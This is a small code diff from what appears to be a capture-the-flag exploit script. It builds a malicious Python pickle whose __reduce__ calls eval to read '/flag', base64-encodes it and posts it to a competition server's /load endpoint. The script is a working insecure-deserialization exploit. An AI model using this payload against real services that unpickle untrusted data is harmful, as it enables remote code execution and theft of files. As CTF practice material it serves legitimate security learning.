@@ -11,7 +11,7 @@ class BadThing:
         return (eval, (self.cmd,))
 
 serialized = pickle.dumps(BadThing('open("/flag").read()'))
-print(serialized)
+print(base64.b64encode(serialized))
 #pickle.loads(serialized)
 
 res = requests.post('http://bamboofox.cs.nctu.edu.tw:15102/load', data={'data':base64.b64encode(serialized)})
